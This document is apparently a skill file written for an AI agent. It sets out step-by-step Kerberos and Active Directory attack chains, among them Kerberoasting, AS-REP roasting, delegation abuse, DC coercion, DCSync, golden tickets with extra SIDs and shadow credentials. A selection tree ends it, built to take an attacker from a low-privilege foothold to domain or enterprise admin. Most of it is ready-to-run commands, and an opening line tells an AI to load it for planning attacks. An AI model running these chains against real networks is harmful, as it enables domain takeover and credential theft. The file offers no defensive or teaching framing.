# Kerberos Multi-Step Attack Chains

> **AI LOAD INSTRUCTION**: Load this for end-to-end Kerberos attack chains that combine multiple AD techniques. Assumes the main [SKILL.md](./SKILL.md) is already loaded for individual Kerberos attacks. Use when planning multi-step attack paths from initial foothold to domain admin.

---

## 1. CHAIN: KERBEROAST → CONSTRAINED DELEGATION → DOMAIN ADMIN

### Scenario
Low-privilege domain user → cracked service account → delegation abuse → DA.

```
Step 1: Kerberoast
│  GetUserSPNs.py DOMAIN/lowpriv:password -dc-ip DC -request
│  hashcat -m 13100 tgs.txt wordlist.txt
│  → Cracked: svc_backup / P@ssw0rd2024
│
Step 2: Enumerate delegation
│  findDelegation.py DOMAIN/svc_backup:P@ssw0rd2024 -dc-ip DC
│  → svc_backup has constrained delegation to cifs/DC01.domain.com
│
Step 3: S4U2Self + S4U2Proxy
│  getST.py -spn cifs/DC01.domain.com -impersonate administrator DOMAIN/svc_backup:P@ssw0rd2024
│
Step 4: Access DC as administrator
│  export KRB5CCNAME=administrator.ccache
│  secretsdump.py -k -no-pass DC01.domain.com
│  → Domain hashes dumped
```

---

## 2. CHAIN: RBCD + KERBEROS → LATERAL MOVEMENT

### Scenario
Write access to a computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` → RBCD → lateral to that host.

```
Step 1: Identify writable computer object
│  (via BloodHound: GenericWrite on TARGET$)
│
Step 2: Create machine account
│  addcomputer.py -computer-name 'EVIL$' -computer-pass 'Passw0rd!' DOMAIN/user:pass -dc-ip DC
│
Step 3: Set RBCD
│  rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write DOMAIN/user:pass -dc-ip DC
│
Step 4: S4U chain
│  getST.py -spn cifs/TARGET.domain.com -impersonate administrator DOMAIN/'EVIL$':'Passw0rd!' -dc-ip DC
│
Step 5: Use ticket
│  export KRB5CCNAME=administrator.ccache
│  psexec.py -k -no-pass TARGET.domain.com
```

---

## 3. CHAIN: UNCONSTRAINED DELEGATION + PRINTERBUG → DCSYNC

### Scenario
Compromised host with unconstrained delegation → coerce DC → capture DC TGT → DCSync.

```
Step 1: Confirm unconstrained delegation
│  Get-DomainComputer -Unconstrained (via PowerView)
│  → WEBSRV01.domain.com has unconstrained delegation
│
Step 2: Start Rubeus monitor on WEBSRV01
│  Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$
│
Step 3: Coerce DC authentication
│  # From any domain machine, trigger PrinterBug:
│  SpoolSample.exe DC01.domain.com WEBSRV01.domain.com
│  # Or PetitPotam:
│  PetitPotam.py WEBSRV01.domain.com DC01.domain.com
│
Step 4: Capture DC01$ TGT from Rubeus output
│  Rubeus.exe ptt /ticket:base64_DC01_TGT
│
Step 5: DCSync with DC machine ticket
│  mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
│  → krbtgt hash obtained → golden ticket capability
```

---

## 4. CHAIN: AS-REP ROAST → ACL ABUSE → DCSYNC

### Scenario
No creds initially → AS-REP roast → cracked user has DCSync rights via ACL path.

```
Step 1: Enumerate users without preauth (no creds needed)
│  GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC -format hashcat
│  → $krb5asrep$23$svc_monitor@DOMAIN:...
│
Step 2: Crack AS-REP hash
│  hashcat -m 18200 asrep.txt wordlist.txt
│  → svc_monitor / Welcome2024!
│
Step 3: BloodHound enumeration
│  bloodhound-python -d domain.com -u svc_monitor -p Welcome2024! -c all -dc DC01
│  → svc_monitor has GenericAll on IT-ADMINS group
│  → IT-ADMINS group has DCSync rights
│
Step 4: Add self to IT-ADMINS
│  net rpc group addmem "IT-ADMINS" svc_monitor -U DOMAIN/svc_monitor -S DC01
│
Step 5: DCSync
│  secretsdump.py DOMAIN/svc_monitor:Welcome2024!@DC01
│  → All domain hashes
```

---

## 5. CHAIN: TARGETED KERBEROAST VIA ACL

### Scenario
GenericWrite on a user → set SPN → kerberoast → crack password.

```
Step 1: Identify GenericWrite permission
│  BloodHound: user "lowpriv" has GenericWrite on "svc_admin"
│
Step 2: Set SPN on target user (targeted kerberoasting)
│  # PowerView
│  Set-DomainObject -Identity svc_admin -Set @{serviceprincipalname='fake/service'}
│  # Or Impacket
│  addspn.py -u DOMAIN/lowpriv -p password -t svc_admin -s fake/service DC01
│
Step 3: Kerberoast the target
│  GetUserSPNs.py DOMAIN/lowpriv:password -dc-ip DC01 -request-user svc_admin
│
Step 4: Crack and clean up
│  hashcat -m 13100 tgs.txt wordlist.txt
│  # Remove the fake SPN
│  Set-DomainObject -Identity svc_admin -Clear serviceprincipalname
```

---

## 6. CHAIN: GOLDEN TICKET → CROSS-DOMAIN ESCALATION

### Scenario
Compromised child domain → golden ticket with SID history → enterprise admin in parent domain.

```
Step 1: Obtain child domain krbtgt hash
│  secretsdump.py CHILD/administrator@childDC -just-dc-user krbtgt
│
Step 2: Get parent domain SID and Enterprise Admins group RID
│  lookupsid.py PARENT/user:pass@parentDC 0
│  → Parent Domain SID: S-1-5-21-PARENT...
│  → Enterprise Admins RID: 519
│
Step 3: Forge golden ticket with SID history (ExtraSIDs)
│  ticketer.py -nthash KRBTGT_HASH \
│    -domain-sid S-1-5-21-CHILD... \
│    -domain CHILD.PARENT.COM \
│    -extra-sid S-1-5-21-PARENT...-519 \
│    administrator
│
Step 4: Access parent domain DC
│  export KRB5CCNAME=administrator.ccache
│  psexec.py -k -no-pass PARENT.COM/administrator@parentDC.parent.com
```

---

## 7. CHAIN: SHADOW CREDENTIALS + KERBEROS

### Scenario
GenericWrite on user → Shadow Credentials → certificate-based auth → TGT.

```
Step 1: Identify GenericWrite on target user/computer
│  BloodHound path analysis
│
Step 2: Add shadow credential (msDS-KeyCredentialLink)
│  # Whisker (Windows)
│  Whisker.exe add /target:svc_admin /domain:domain.com /dc:DC01
│  → Certificate and device ID generated
│
│  # pyWhisker (Linux)
│  pywhisker.py -d domain.com -u lowpriv -p password --target svc_admin --action add --dc-ip DC01
│
Step 3: Use certificate to get TGT (PKINIT)
│  Rubeus.exe asktgt /user:svc_admin /certificate:cert.pfx /password:certpass /ptt
│
│  # Or with PKINITtools
│  gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass certpass DOMAIN/svc_admin tgt.ccache
│
Step 4: Use TGT for further attacks
│  export KRB5CCNAME=tgt.ccache
│  # Now act as svc_admin
```

---

## 8. ATTACK CHAIN SELECTION GUIDE

```
What access do you have?
│
├── No domain creds
│   ├── Username list available? → AS-REP Roast (Chain 4)
│   └── Network access only? → NTLM relay → see ntlm-relay-coercion
│
├── Low-privilege domain user
│   ├── Kerberoastable SPNs found? → Kerberoast chain (Chain 1)
│   ├── GenericWrite on user? → Targeted Kerberoast (Chain 5) or Shadow Creds (Chain 7)
│   ├── GenericWrite on computer? → RBCD (Chain 2)
│   └── Host with unconstrained delegation? → PrinterBug chain (Chain 3)
│
├── Service account compromised
│   ├── Has constrained delegation? → S4U chain (Chain 1)
│   └── No delegation? → Silver ticket for specific service
│
├── Domain Admin in child domain
│   └── Want parent domain? → Golden ticket + ExtraSIDs (Chain 6)
│
└── Have krbtgt hash
    ├── Golden ticket (basic persistence)
    ├── Diamond ticket (evasive persistence)
    └── Sapphire ticket (hardest to detect)
```
